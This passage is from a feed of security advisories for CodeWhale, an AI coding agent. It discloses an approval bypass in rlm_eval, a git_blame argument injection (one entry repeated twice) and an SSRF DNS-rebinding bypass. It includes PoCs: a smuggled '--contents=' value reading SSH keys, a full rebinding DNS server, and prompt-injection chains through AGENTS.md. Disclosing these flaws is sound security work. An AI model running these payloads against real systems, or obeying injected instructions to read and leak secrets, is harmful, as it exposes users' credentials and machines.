+<p>The <code>rlm_eval</code> tool runs an arbitrary Python string chosen by the model in a real <code>python3</code> interpreter. Its <code>approval_requirement()</code> returns <code>ApprovalRequirement::Auto</code>, which the engine treats as "never prompt," regardless of the user's configured <code>--approval-policy</code>. A single tool call — which prompt injection from any untrusted content the agent reads (a web page, a fetched URL, a repo file, an MCP tool result) can induce — runs code on the user's machine at the user's privilege with no prompt and no audit step. This is the same defect that was already patched on the sibling <code>run_tests</code> tool (CVE-2026-45311); the fix never reached <code>rlm_eval</code> or <code>rlm_open</code>, which expose a broader surface (full Python on the host, not just <code>cargo test</code>).</p>
+<h3 id="details">Details</h3>
+<p><code>rlm_eval</code>'s <code>execute()</code> reads the LLM-controlled <code>code</code> field and runs it (<code>crates/tui/src/tools/rlm.rs:215-300</code>):</p>
+<pre><code class="language-rust">fn capabilities(&amp;self) -&gt; Vec&lt;ToolCapability&gt; {
+    vec![ToolCapability::Network, ToolCapability::ExecutesCode]
+}
+
+fn approval_requirement(&amp;self) -&gt; ApprovalRequirement {
+    ApprovalRequirement::Auto          // overrides the safe default below
+}
+
+async fn execute(&amp;self, input: Value, context: &amp;ToolContext) -&gt; Result&lt;ToolResult, ToolError&gt; {
+    let name = required_non_empty_str(&amp;input, "name")?;
+    let code = required_non_empty_str(&amp;input, "code")?;   // LLM-controlled
+    ...
+    let round = kernel.run(code, Some(&amp;bridge)).await...   // runs that code in python3
+</code></pre>
+<p>The trait default at <code>crates/tui/src/tools/spec.rs:632-633</code> would have returned <code>Required</code> for any tool whose capabilities include <code>ExecutesCode</code>. <code>rlm_eval</code> deliberately overrides that to <code>Auto</code>.</p>
+<p>The engine's approval gate (<code>crates/tui/src/core/engine.rs:845</code>) is two AND-ed conditions, and a per-tool <code>Auto</code> makes the first one false:</p>
+<pre><code class="language-rust">let approval_required = spec.approval_requirement() != ApprovalRequirement::Auto
+    &amp;&amp; !registry.context().auto_approve;
+</code></pre>
+<p>When <code>approval_requirement()</code> is <code>Auto</code>, <code>approval_required</code> is <code>false</code>, no <code>Event::ApprovalRequired</code> is emitted, and the user's <code>--approval-policy</code> (<code>on-request</code>, <code>unless-trusted</code>, <code>never</code>) is never consulted. The companion tool <code>rlm_open</code> (<code>rlm.rs:142-143</code>, same <code>Auto</code>, capabilities include <code>ExecutesCode</code> + <code>Network</code>) spawns the same Python kernel via <code>PythonRuntime::spawn_with_context</code> (<code>rlm.rs:181</code>) and can stage a <code>content</code> string, a <code>file_path</code> read, or a <code>url</code> fetch into the kernel before <code>rlm_eval</code> runs against it. Both tools are registered unconditionally by the default registry (<code>crates/tui/src/tools/registry.rs:802-803</code>); there is no flag to disable them.</p>
+<h3 id="poc">PoC</h3>
+<p>Source-level reproduction. Point a provider's <code>base_url</code> at a local mock that returns canned <code>tool_calls</code>, then have the agent call <code>rlm_open</code> followed by <code>rlm_eval</code> with a <code>code</code> payload such as:</p>
+<pre><code class="language-python">import os, getpass, socket
+open('/tmp/pwned_by_rlm_eval','w').write(getpass.getuser()+'@'+socket.gethostname()+':'+os.getcwd())
+</code></pre>
+<p>Run it through the non-interactive path (<code>codewhale exec --auto</code>) to confirm the tool executes, and through the plain interactive TUI under <code>--approval-policy on-request</code> (no <code>--auto</code>, no <code>--yolo</code>) to confirm no approval dialog appears. The sentinel file is written either way; the interactive run is the one that proves the policy is bypassed rather than waived.</p>
+<h3 id="impact">Impact</h3>
+<p>Unsandboxed code execution on the user's workstation at the user's UID: read SSH keys, cloud credentials, <code>~/.codewhale/auth.json</code>, and other secrets; write to shell rc files or <code>authorized_keys</code> for persistence; spawn subprocesses; reach the network. No filesystem, network, or process sandbox is applied to the spawned interpreter. Reachable with user interaction (running the agent over attacker-influenced content), no further prompt.</p>
+<h3 id="credit">Credit</h3>
+<p><a href="https://github.com/sai-sh">sai-sh</a></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/Hmbown/CodeWhale/security/advisories/GHSA-wrj3-vj8c-784f">https://github.com/Hmbown/CodeWhale/security/advisories/GHSA-wrj3-vj8c-784f</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-75858">https://nvd.nist.gov/vuln/detail/CVE-2026-75858</a></li>
+<li><a href="https://github.com/Hmbown/CodeWhale/commit/57f3c89471e27ac4032d9791f6885e5d4408c381">https://github.com/Hmbown/CodeWhale/commit/57f3c89471e27ac4032d9791f6885e5d4408c381</a></li>
+<li><a href="https://www.vulncheck.com/advisories/codewhale-rlm-eval-before-remote-code-execution">https://www.vulncheck.com/advisories/codewhale-rlm-eval-before-remote-code-execution</a></li>
+<li><a href="https://github.com/advisories/GHSA-wrj3-vj8c-784f">https://github.com/advisories/GHSA-wrj3-vj8c-784f</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-wrj3-vj8c-784f</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-09-04T18:12:15.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[codewhale] CodeWhale: Argument Injection in `git_blame` Tool Allows Arbitrary File Read Without Approval]]></title>
+        <id>https://github.com/advisories/GHSA-c6mw-8xh8-gpq6</id>
+        <link href="https://github.com/advisories/GHSA-c6mw-8xh8-gpq6"/>
+        <updated>2026-09-04T18:11:46.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="maintainer-resolution">Maintainer resolution</h3>
+<p>The CodeWhale maintainers validated this report. The affected package ranges are recorded in the advisory metadata. Version 0.8.64 contains the fix in commit 9a34b5034d29f05d1f28fa61b04719ca6a741020. Users should upgrade to 0.8.64 or later. The original reporter analysis is preserved below.</p>
+<h1 id="argument-injection-in-git_blame-tool-allows-arbitrary-file-read-without-approval">Argument Injection in <code>git_blame</code> Tool Allows Arbitrary File Read Without Approval</h1>
+<h2 id="overview">Overview</h2>
+<p>The <code>git_blame</code> tool in DeepSeek-TUI passes the model-supplied <code>rev</code> parameter unvalidated into the argv of <code>git blame</code>. <code>git blame</code> accepts <code>--contents=&lt;file&gt;</code>, which causes it to use the file's contents in place of the working tree and echo each line verbatim in the blame output. A <code>rev</code> value of <code>--contents=/path/to/secret</code> therefore exfiltrates the targeted file's contents into the tool result, which is returned to the model and displayed in the chat transcript.</p>
+<p>The tool is registered with <code>ApprovalRequirement::Auto</code> and declares <code>ToolCapability::ReadOnly</code>. The read is in-scope for the capability label, but the <em>target</em> of the read is not the user expects <code>git_blame</code> to read files inside the workspace, not arbitrary paths on the host.</p>
+<p>This is a sibling of the <code>git_show</code> argument-injection vulnerability filed separately, sharing the same root cause (missing <code>--end-of-options</code> sentinel and unvalidated <code>rev</code>).</p>
+<h2 id="impact">Impact</h2>
+<p>Arbitrary file read at the privilege of the user running DeepSeek-TUI, via malicious repository content combined with prompt injection (the threat model already documented in CVE-2026-45311).</p>
+<p>Reachable as the invoking user:</p>
+<ul>
+<li><code>~/.ssh/id_rsa</code>, <code>~/.ssh/id_ed25519</code>, and other private keys</li>
+<li><code>~/.aws/credentials</code>, <code>~/.config/gh/hosts.yml</code>, <code>~/.netrc</code></li>
+<li><code>.env</code> files anywhere in the filesystem</li>
+<li>Any project file outside the workspace the tool would normally restrict to</li>
+</ul>
+<p>The leaked contents land in the model's context. The same model that obeyed the prompt-injection in step one can be instructed to forward the leak via <code>fetch_url</code> (network-policy permitting), summarize it in chat, or write it into a tool output the attacker can later retrieve.</p>
+<h2 id="technical-details">Technical Details</h2>
+<h3 id="root-cause">Root Cause</h3>
+<p><code>crates/tui/src/tools/git_history.rs</code>:</p>
+<pre><code class="language-rust">// L314-316
+fn approval_requirement(&amp;self) -&gt; ApprovalRequirement {
+    ApprovalRequirement::Auto
+}
+
+// L322-358 (excerpt)
+async fn execute(&amp;self, input: Value, context: &amp;ToolContext) -&gt; Result&lt;ToolResult, ToolError&gt; {
+    let path_str = required_str(&amp;input, "path")?;
+    let resolved_path = context.resolve_path(path_str)?;   // path is bounded to workspace
+    ...
+    let rev = optional_str(&amp;input, "rev").unwrap_or("HEAD");   // rev is NOT bounded
+    ...
+    let mut args = vec![
+        "blame".to_string(),
+        "--date=iso".to_string(),
+        format!("-L{start_line},{end_line}"),
+    ];
+    if porcelain { args.push("--line-porcelain".to_string()); }
+    args.push(rev.to_string());            // unvalidated, no sentinel
+    args.push("--".to_string());
+    args.push(pathspec.display().to_string());
+    ...
+}
+</code></pre>
+<p><code>path</code> correctly flows through <code>context.resolve_path</code>, which enforces workspace containment (<code>spec.rs:342</code>). <code>rev</code> does not and the <code>--</code> separator after <code>rev</code> only ends pathspec parsing, it does not stop option parsing of <code>rev</code> itself.</p>
+<p>The JSON schema for <code>rev</code> (L283-285) is <code>{"type": "string"}</code> with no constraints.</p>
+<h3 id="why---contents-works">Why <code>--contents</code> Works</h3>
+<p><code>git blame --contents=&lt;file&gt; -- &lt;pathspec&gt;</code> blames the working tree path <em>as if its contents were the supplied file</em>. Each line of the supplied file appears verbatim in the porcelain or human-readable output, prefixed with the attribution marker <code>00000000 (External file (--contents) &lt;date&gt; N)</code>. The full line content is preserved.</p>
+<p>Two secondary primitives in the same parser also leak data, with smaller
+yield:</p>
+<ul>
+<li><code>--ignore-revs-file=&lt;file&gt;</code> : surfaces parse errors that disclose partial content when the file is not a valid revs list.</li>
+<li><code>-S &lt;file&gt;</code>, <code>--reverse &lt;rev1&gt;..&lt;rev2&gt;</code> : not directly exploitable for read but expand the option surface that argv injection can reach.</li>
+</ul>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<p>Argv assembled by the tool with input
+<code>{"path": "a.txt", "rev": "--contents=/home/a/.ssh/id_rsa"}</code>:</p>
+<pre><code>git blame --date=iso -L1,200 --contents=/home/a/.ssh/id_rsa -- a.txt
+</code></pre>
+<p>Reproduced against system <code>git</code> as a non-root user:</p>
+<pre><code>$ id
+uid=1001(a) gid=1001(a) groups=1001(a)
+
+$ echo "PRIVATEKEYDATA" &gt; /home/a/.ssh/id_rsa
+$ chmod 600 /home/a/.ssh/id_rsa
+
+$ git blame --date=iso -L1,5 "--contents=/home/a/.ssh/id_rsa" -- a.txt
+00000000 (External file (--contents) 2026-05-19 07:05:51 -0400 1) PRIVATEKEYDATA
+</code></pre>
+<p>A non-readable target (<code>/etc/shadow</code>, owned by root with mode 0640) returns <code>Permission denied</code>, confirming the read is bounded by uid as expected; this is not a privilege boundary bypass, it is the desktop user's own filesystem view being exposed past the workspace boundary the tool's <code>path</code> argument otherwise enforces.</p>
+<p>End-to-end exploitation is identical to the <code>git_show</code> companion: malicious repo → <code>AGENTS.md</code> injection → model calls <code>git_blame</code> with the crafted <code>rev</code> → auto-approval → leaked content returned in tool output and consumed by the model.</p>
+<h2 id="remediation">Remediation</h2>
+<p>Same shape as the <code>git_show</code> fix:</p>
+<pre><code class="language-rust">args.push("--end-of-options".to_string());
+args.push(rev.to_string());
+args.push("--".to_string());
+args.push(pathspec.display().to_string());
+</code></pre>
+<p>Plus a leading-hyphen rejection on <code>rev</code>. A regression test should pin both <code>rev = "--contents=/etc/passwd"</code> and <code>rev = "--ignore-revs-file=/etc/passwd"</code> as rejected inputs.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/Hmbown/CodeWhale/security/advisories/GHSA-c6mw-8xh8-gpq6">https://github.com/Hmbown/CodeWhale/security/advisories/GHSA-c6mw-8xh8-gpq6</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-75912">https://nvd.nist.gov/vuln/detail/CVE-2026-75912</a></li>
+<li><a href="https://github.com/Hmbown/CodeWhale/commit/9a34b5034d29f05d1f28fa61b04719ca6a741020">https://github.com/Hmbown/CodeWhale/commit/9a34b5034d29f05d1f28fa61b04719ca6a741020</a></li>
+<li><a href="https://www.vulncheck.com/advisories/codewhale-before-argument-injection-via-git-blame">https://www.vulncheck.com/advisories/codewhale-before-argument-injection-via-git-blame</a></li>
+<li><a href="https://github.com/advisories/GHSA-c6mw-8xh8-gpq6">https://github.com/advisories/GHSA-c6mw-8xh8-gpq6</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-c6mw-8xh8-gpq6</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-09-04T18:11:45.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[deepseek-tui] CodeWhale: Argument Injection in `git_blame` Tool Allows Arbitrary File Read Without Approval]]></title>
+        <id>https://github.com/advisories/GHSA-c6mw-8xh8-gpq6</id>
+        <link href="https://github.com/advisories/GHSA-c6mw-8xh8-gpq6"/>
+        <updated>2026-09-04T18:11:46.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="maintainer-resolution">Maintainer resolution</h3>
+<p>The CodeWhale maintainers validated this report. The affected package ranges are recorded in the advisory metadata. Version 0.8.64 contains the fix in commit 9a34b5034d29f05d1f28fa61b04719ca6a741020. Users should upgrade to 0.8.64 or later. The original reporter analysis is preserved below.</p>
+<h1 id="argument-injection-in-git_blame-tool-allows-arbitrary-file-read-without-approval">Argument Injection in <code>git_blame</code> Tool Allows Arbitrary File Read Without Approval</h1>
+<h2 id="overview">Overview</h2>
+<p>The <code>git_blame</code> tool in DeepSeek-TUI passes the model-supplied <code>rev</code> parameter unvalidated into the argv of <code>git blame</code>. <code>git blame</code> accepts <code>--contents=&lt;file&gt;</code>, which causes it to use the file's contents in place of the working tree and echo each line verbatim in the blame output. A <code>rev</code> value of <code>--contents=/path/to/secret</code> therefore exfiltrates the targeted file's contents into the tool result, which is returned to the model and displayed in the chat transcript.</p>
+<p>The tool is registered with <code>ApprovalRequirement::Auto</code> and declares <code>ToolCapability::ReadOnly</code>. The read is in-scope for the capability label, but the <em>target</em> of the read is not the user expects <code>git_blame</code> to read files inside the workspace, not arbitrary paths on the host.</p>
+<p>This is a sibling of the <code>git_show</code> argument-injection vulnerability filed separately, sharing the same root cause (missing <code>--end-of-options</code> sentinel and unvalidated <code>rev</code>).</p>
+<h2 id="impact">Impact</h2>
+<p>Arbitrary file read at the privilege of the user running DeepSeek-TUI, via malicious repository content combined with prompt injection (the threat model already documented in CVE-2026-45311).</p>
+<p>Reachable as the invoking user:</p>
+<ul>
+<li><code>~/.ssh/id_rsa</code>, <code>~/.ssh/id_ed25519</code>, and other private keys</li>
+<li><code>~/.aws/credentials</code>, <code>~/.config/gh/hosts.yml</code>, <code>~/.netrc</code></li>
+<li><code>.env</code> files anywhere in the filesystem</li>
+<li>Any project file outside the workspace the tool would normally restrict to</li>
+</ul>
+<p>The leaked contents land in the model's context. The same model that obeyed the prompt-injection in step one can be instructed to forward the leak via <code>fetch_url</code> (network-policy permitting), summarize it in chat, or write it into a tool output the attacker can later retrieve.</p>
+<h2 id="technical-details">Technical Details</h2>
+<h3 id="root-cause">Root Cause</h3>
+<p><code>crates/tui/src/tools/git_history.rs</code>:</p>
+<pre><code class="language-rust">// L314-316
+fn approval_requirement(&amp;self) -&gt; ApprovalRequirement {
+    ApprovalRequirement::Auto
+}
+
+// L322-358 (excerpt)
+async fn execute(&amp;self, input: Value, context: &amp;ToolContext) -&gt; Result&lt;ToolResult, ToolError&gt; {
+    let path_str = required_str(&amp;input, "path")?;
+    let resolved_path = context.resolve_path(path_str)?;   // path is bounded to workspace
+    ...
+    let rev = optional_str(&amp;input, "rev").unwrap_or("HEAD");   // rev is NOT bounded
+    ...
+    let mut args = vec![
+        "blame".to_string(),
+        "--date=iso".to_string(),
+        format!("-L{start_line},{end_line}"),
+    ];
+    if porcelain { args.push("--line-porcelain".to_string()); }
+    args.push(rev.to_string());            // unvalidated, no sentinel
+    args.push("--".to_string());
+    args.push(pathspec.display().to_string());
+    ...
+}
+</code></pre>
+<p><code>path</code> correctly flows through <code>context.resolve_path</code>, which enforces workspace containment (<code>spec.rs:342</code>). <code>rev</code> does not and the <code>--</code> separator after <code>rev</code> only ends pathspec parsing, it does not stop option parsing of <code>rev</code> itself.</p>
+<p>The JSON schema for <code>rev</code> (L283-285) is <code>{"type": "string"}</code> with no constraints.</p>
+<h3 id="why---contents-works">Why <code>--contents</code> Works</h3>
+<p><code>git blame --contents=&lt;file&gt; -- &lt;pathspec&gt;</code> blames the working tree path <em>as if its contents were the supplied file</em>. Each line of the supplied file appears verbatim in the porcelain or human-readable output, prefixed with the attribution marker <code>00000000 (External file (--contents) &lt;date&gt; N)</code>. The full line content is preserved.</p>
+<p>Two secondary primitives in the same parser also leak data, with smaller
+yield:</p>
+<ul>
+<li><code>--ignore-revs-file=&lt;file&gt;</code> : surfaces parse errors that disclose partial content when the file is not a valid revs list.</li>
+<li><code>-S &lt;file&gt;</code>, <code>--reverse &lt;rev1&gt;..&lt;rev2&gt;</code> : not directly exploitable for read but expand the option surface that argv injection can reach.</li>
+</ul>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<p>Argv assembled by the tool with input
+<code>{"path": "a.txt", "rev": "--contents=/home/a/.ssh/id_rsa"}</code>:</p>
+<pre><code>git blame --date=iso -L1,200 --contents=/home/a/.ssh/id_rsa -- a.txt
+</code></pre>
+<p>Reproduced against system <code>git</code> as a non-root user:</p>
+<pre><code>$ id
+uid=1001(a) gid=1001(a) groups=1001(a)
+
+$ echo "PRIVATEKEYDATA" &gt; /home/a/.ssh/id_rsa
+$ chmod 600 /home/a/.ssh/id_rsa
+
+$ git blame --date=iso -L1,5 "--contents=/home/a/.ssh/id_rsa" -- a.txt
+00000000 (External file (--contents) 2026-05-19 07:05:51 -0400 1) PRIVATEKEYDATA
+</code></pre>
+<p>A non-readable target (<code>/etc/shadow</code>, owned by root with mode 0640) returns <code>Permission denied</code>, confirming the read is bounded by uid as expected; this is not a privilege boundary bypass, it is the desktop user's own filesystem view being exposed past the workspace boundary the tool's <code>path</code> argument otherwise enforces.</p>
+<p>End-to-end exploitation is identical to the <code>git_show</code> companion: malicious repo → <code>AGENTS.md</code> injection → model calls <code>git_blame</code> with the crafted <code>rev</code> → auto-approval → leaked content returned in tool output and consumed by the model.</p>
+<h2 id="remediation">Remediation</h2>
+<p>Same shape as the <code>git_show</code> fix:</p>
+<pre><code class="language-rust">args.push("--end-of-options".to_string());
+args.push(rev.to_string());
+args.push("--".to_string());
+args.push(pathspec.display().to_string());
+</code></pre>
+<p>Plus a leading-hyphen rejection on <code>rev</code>. A regression test should pin both <code>rev = "--contents=/etc/passwd"</code> and <code>rev = "--ignore-revs-file=/etc/passwd"</code> as rejected inputs.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/Hmbown/CodeWhale/security/advisories/GHSA-c6mw-8xh8-gpq6">https://github.com/Hmbown/CodeWhale/security/advisories/GHSA-c6mw-8xh8-gpq6</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-75912">https://nvd.nist.gov/vuln/detail/CVE-2026-75912</a></li>
+<li><a href="https://github.com/Hmbown/CodeWhale/commit/9a34b5034d29f05d1f28fa61b04719ca6a741020">https://github.com/Hmbown/CodeWhale/commit/9a34b5034d29f05d1f28fa61b04719ca6a741020</a></li>
+<li><a href="https://www.vulncheck.com/advisories/codewhale-before-argument-injection-via-git-blame">https://www.vulncheck.com/advisories/codewhale-before-argument-injection-via-git-blame</a></li>
+<li><a href="https://github.com/advisories/GHSA-c6mw-8xh8-gpq6">https://github.com/advisories/GHSA-c6mw-8xh8-gpq6</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-c6mw-8xh8-gpq6</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-09-04T18:11:45.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[codewhale] CodeWhale: SSRF‌ bypass - TOCTOU on DNS failure for DNS pinning]]></title>
+        <id>https://github.com/advisories/GHSA-6v2g-fpxh-pmmh</id>
+        <link href="https://github.com/advisories/GHSA-6v2g-fpxh-pmmh"/>
+        <updated>2026-09-04T18:05:13.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="maintainer-resolution">Maintainer resolution</h3>
+<p>The CodeWhale maintainers validated this report. The affected package ranges are recorded in the advisory metadata. Version 0.8.64 contains the fix in commit 26de44a8bd5051f8f944ea60b2c37ae1d2b7d25e. Users should upgrade to 0.8.64 or later. The original reporter analysis is preserved below.</p>
+<h3 id="summary">Summary</h3>
+<p>DNS-pinning failure allows natural failure of code, however with a custom DNS server that fails the initial requests and allows the secondary requests, it's possible to bypass the logic.</p>
+<h3 id="details">Details</h3>
+<p>Simplified attack scenario:</p>
+<ol>
+<li>Attacker asks agent to visit the <code>mydomain.com</code>.</li>
+<li>CodeWhale tries to resolve the IP of <code>mydomain.com</code>, however, the custom DNS server that's controlled by the attacker marks the request DNS‌ query as failed (Time of Check). </li>
+<li>CodeWhale allows the code to continue as it expects it request to fail again.</li>
+<li>On the secondary (Time of Use), the DNS server resolves mydomain.com to a local IP (e.g., 127.0.0.1)</li>
+<li>The request is executed and the content from port 80 is returned to the attacker, allowing full bypass of SSRF mitigations.</li>
+</ol>
+<p>In the <a href="https://github.com/Hmbown/CodeWhale/blob/8dff2f7525ead210a01347b48f53ae3f20d094ec/crates/tui/src/tools/fetch_url.rs#L362">DNS-pinning</a> section, when DNS fails, the code is allowed to continue as it's expected to fail. However</p>
+<h3 id="poc">PoC</h3>
+<p>This is a custom DNS server that fails the first requests (in this case, the first and second requests must fail, while the 3rd and 4th are allowed due to A and AAAA DNS queries). Here is the code for the DNS‌ server(for PoC, should be placed in <code>dnser/dns_resolver.py</code>:</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+"""
+Local DNS Resolver — customizable request/response handling.
+Uses only the standard library + dnslib.
+
+Usage:
+    pip install dnslib
+    sudo python dns_resolver.py          # binds to 0.0.0.0:53 by default
+    python dns_resolver.py --port 5353   # unprivileged port for testing
+"""
+
+import argparse
+import socket
+import threading
+from dnslib import DNSRecord, DNSHeader, RR, QTYPE, A, CNAME, AAAA
+
+
+UPSTREAM_DNS = ("8.8.8.8", 53)   # fallback resolver
+
+
+def handle_no_aaaa(query: DNSRecord) -&gt; DNSRecord | None:
+    """Drop all AAAA requests."""
+    if QTYPE[query.q.qtype] == "AAAA":
+        reply = query.reply()
+        reply.header.rcode = 3  # NXDOMAIN
+        return reply
+    return None
+
+def handle_blocked(query: DNSRecord) -&gt; DNSRecord | None:
+    """Block domains by returning NXDOMAIN."""
+    blocked = {"blocked.example.com.", "ads.tracker.io."}
+    qname = str(query.q.qname)
+    if qname in blocked:
+        print(f"  [BLOCKED] {qname}")
+        reply = query.reply()
+        reply.header.rcode = 3          # NXDOMAIN
+        return reply
+    return None
+
+failer = 0
+MAX_FAIL = 2
+MAX_SUCCESS = 2
+
+def handle_overrides(query: DNSRecord) -&gt; DNSRecord | None:
+    global failer
+    """Return hardcoded A records for specific names (split-horizon / local dev)."""
+    overrides: dict[str, str] = {
+        "myapp.local.":     "127.0.0.1",
+        "devserver.local.": "192.168.1.100",
+        "mydomain.com.":    "127.0.0.1",
+    }
+    qname = str(query.q.qname)
+    qtype = QTYPE[query.q.qtype]
+
+    if qname in overrides and qtype == "A":
+        failer += 1
+        cycle_pos = (failer - 1) % (MAX_FAIL + MAX_SUCCESS)  # position within cycle
+        should_fail = cycle_pos &lt; MAX_FAIL
+
+        print(f"  [OVERRIDE] request={failer} cycle_pos={cycle_pos} fail={should_fail}")
+
+        if should_fail:
+            reply = query.reply()
+            reply.header.rcode = 3
+            reply.header.ra = 0
+            return reply
+
+        ip = overrides[qname]
+        print(f"  [OVERRIDE] {qname} → {ip}")
+        reply = query.reply()
+        reply.add_answer(RR(qname, QTYPE.A, rdata=A(ip), ttl=0))
+        reply.header.ra = 0
+        return reply
+
+    return None
+
+
+def handle_rewrite(query: DNSRecord) -&gt; DNSRecord | None:
+    """Rewrite a CNAME transparently (resolve alias locally)."""
+    rewrites: dict[str, str] = {
+        # "old.internal.": "new.internal.",
+    }
+    qname = str(query.q.qname)
+    if qname in rewrites:
+        target = rewrites[qname]
+        print(f"  [REWRITE] {qname} → {target}")
+        reply = query.reply()
+        reply.add_answer(RR(qname, QTYPE.CNAME, rdata=CNAME(target), ttl=60))
+        return reply
+    return None
+
+
+def handle_upstream(query: DNSRecord) -&gt; DNSRecord | None:
+    """Forward the query to the upstream resolver."""
+    try:
+        raw = query.pack()
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.settimeout(3)
+        sock.sendto(raw, UPSTREAM_DNS)
+        data, _ = sock.recvfrom(4096)
+        sock.close()
+        reply = DNSRecord.parse(data)
+        print(f"  [UPSTREAM] {query.q.qname} → {UPSTREAM_DNS[0]}")
+        return reply
+    except Exception as e:
+        print(f"  [UPSTREAM ERROR] {e}")
+        return None
+
+
+# Chain of responsibility — handlers are tried in order; first non-None wins.
+HANDLERS = [
+    handle_blocked,
+    handle_overrides,
+    handle_rewrite,
+    handle_upstream,
+]
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+#  Server plumbing — no need to edit below this line
+# ─────────────────────────────────────────────────────────────────────────────
+
+def resolve(data: bytes) -&gt; bytes:
+    try:
+        query = DNSRecord.parse(data)
+        qname = str(query.q.qname)
+        qtype = QTYPE[query.q.qtype]
+        print(f"[QUERY] {qtype} {qname}")
+
+        for handler in HANDLERS:
+            reply = handler(query)
+            if reply is not None:
+                return reply.pack()
+
+        # Fallback: SERVFAIL
+        reply = query.reply()
+        reply.header.rcode = 2
+        return reply.pack()
+
+    except Exception as e:
+        print(f"[ERROR] Failed to parse/handle query: {e}")
+        return b""
+
+
+def udp_server(host: str, port: int) -&gt; None:
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    sock.bind((host, port))
+    print(f"DNS resolver listening on {host}:{port} (UDP)")
+    while True:
+        data, addr = sock.recvfrom(4096)
+        threading.Thread(
+            target=lambda d=data, a=addr: sock.sendto(resolve(d), a),
+            daemon=True,
+        ).start()
+
+
+def tcp_server(host: str, port: int) -&gt; None:
+    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    srv.bind((host, port))
+    srv.listen(10)
+    print(f"DNS resolver listening on {host}:{port} (TCP)")
+
+    def handle_conn(conn: socket.socket) -&gt; None:
+        with conn:
+            length_bytes = conn.recv(2)
+            if len(length_bytes) &lt; 2:
+                return
+            length = int.from_bytes(length_bytes, "big")
+            data = conn.recv(length)
+            response = resolve(data)
+            conn.sendall(len(response).to_bytes(2, "big") + response)
+
+    while True:
+        conn, _ = srv.accept()
+        threading.Thread(target=handle_conn, args=(conn,), daemon=True).start()
+
+
+def main() -&gt; None:
+    parser = argparse.ArgumentParser(description="Local DNS resolver")
+    parser.add_argument("--host", default="0.0.0.0", help="Bind address")
+    parser.add_argument("--port", type=int, default=53, help="Bind port (use 5353 for unprivileged)")
+    args = parser.parse_args()
+
+    t_udp = threading.Thread(target=udp_server, args=(args.host, args.port), daemon=True)
+    t_tcp = threading.Thread(target=tcp_server, args=(args.host, args.port), daemon=True)
+    t_udp.start()
+    t_tcp.start()
+
+    try:
+        t_udp.join()
+    except KeyboardInterrupt:
+        print("\nShutting down.")
+
+
+if __name__ == "__main__":
+    main()
+</code></pre>
+<p>Docker file to build it(<code>dnser/Dockerfile</code>):</p>
+<pre><code class="language-bash">FROM python:3.12-slim
+
+WORKDIR /app
+
+RUN pip install dnslib --no-cache-dir
+
+COPY dns_resolver.py .
+
+EXPOSE 53/udp
+EXPOSE 53/tcp
+
+CMD ["python", "-u", "dns_resolver.py", "--host", "0.0.0.0", "--port", "53"]
+</code></pre>
+<p>Then to simplify the test, we can set everything in a container and make the agent use the local DNS resolver:</p>
+<p><code>docker-compose.yml</code>:</p>
+<pre><code class="language-yaml">services:
+  dns-resolver:
+    build: dnser
+    container_name: dns-resolver
+    restart: unless-stopped
+    networks:
+      dns-net:
+        ipv4_address: 10.0.1.2
+
+  a:
+    image: ghcr.io/hmbown/deepseek-tui:latest
+    container_name: tui
+    environment:
+      DEEPSEEK_API_KEY: sk-
+    stdin_open: true
+    tty: true
+    dns: 10.0.1.2
+    networks:
+      - dns-net
+    depends_on:
+      - dns-resolver
+    sysctls:
+      net.ipv6.conf.all.disable_ipv6: 1
+
+
+
+networks:
+  dns-net:
+    driver: bridge
+    ipam:
+      config:
+        - subnet: 10.0.1.0/24
+</code></pre>
+<p>Then to check everything we could simply:
+<code>sudo docker attach tui</code>
+Prompt: <code>read contnet of http://mydomain.com using fetch_url tools, no thinking just raw output</code>
+The tool will allow the request to go through 127.0.0.1. To make sure it's not a false-positive I've also installed python in CodeWhale container and ran <code>python3 -m http.server 80</code> as root to make sure the request can actually read content.</p>
+<p>To read the logs from dns-resolver:
+<code>sudo docker logs -f dns-resolver</code></p>
+<h3 id="impact">Impact</h3>
+<p>Similar to other SSRF bypasses, other services private on the system, private network, and cloud credentials are at risk.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/Hmbown/CodeWhale/security/advisories/GHSA-6v2g-fpxh-pmmh">https://github.com/Hmbown/CodeWhale/security/advisories/GHSA-6v2g-fpxh-pmmh</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-75856">https://nvd.nist.gov/vuln/detail/CVE-2026-75856</a></li>
